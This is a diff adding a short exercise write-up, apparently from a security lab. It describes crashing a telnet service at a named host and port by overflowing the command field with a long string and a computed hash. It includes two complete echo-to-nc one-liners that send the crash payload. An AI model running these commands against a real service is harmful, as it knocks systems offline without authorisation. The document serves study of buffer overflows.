@@ -1,0 +1,37 @@
+Username is at most 10 characters and HMAC is 65 HEx characters, these are not changeable. However, command is the only
+element that can be arbitrary, so we can make overflow buffer by making the command very long
+
+The telnet server only accepts the form
+ClientCmd|< user_number >|< command >
+For example: ClientCmd|135355|aaa
+
+If not, it will display
+Invalid message. Should be "user;command;hmac\n".
+
+This is telnet server:
+nc device1.vikaa.fi 50516 
+
+Go to any SHA 256 online generator and type a random long string but with the form above, then convert it to SHA 256. 
+For the key of the generator, choose a 20 word long random, because the keyphrase is 20 bytes long right after the command 
+https://www.liavaag.org/English/SHA-Generator/HMAC/
+
+For example:
+let command be: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffaaaaaaaaaaaaaaaaaaaa
+
+The form to be encrypted for SHA 256 would look like
+ClientCmd|135355|ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffaaaaaaaaaaaaaaaaaaaa
+
+the SHA 256 output will be
+96666b051fb4f6705f3123e6b4addae77a4e9854c4ae81f5def4787cb2310486
+
+(Do not put in the key in the generator because we only need to crash the server)
+
+The final input is username;command;hamc. Use echo and | (telnet server) to send the input to the server
+
+echo "135355;ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffaaaaaaaaaaaaaaaaaaaa;96666b051fb4f6705f3123e6b4addae77a4e9854c4ae81f5def4787cb2310486" | nc device1.vikaa.fi 50516
+
+Inputting that line above will crash the server
+This one is another example
+echo "135355;qfjbqfoefnwofneiwofnewiofnewifniofnwoifnewiofnwenvweovnoiweniowenviewnviowenvwoivnewiovnwiovnewivwvwvwevwevwevwevwvwevvewewvss;BE599D930006B4316B0F8CD07A21B462A5FF953653ED819375083AFDC2699D59" | nc device1.vikaa.fi 50516
+
+
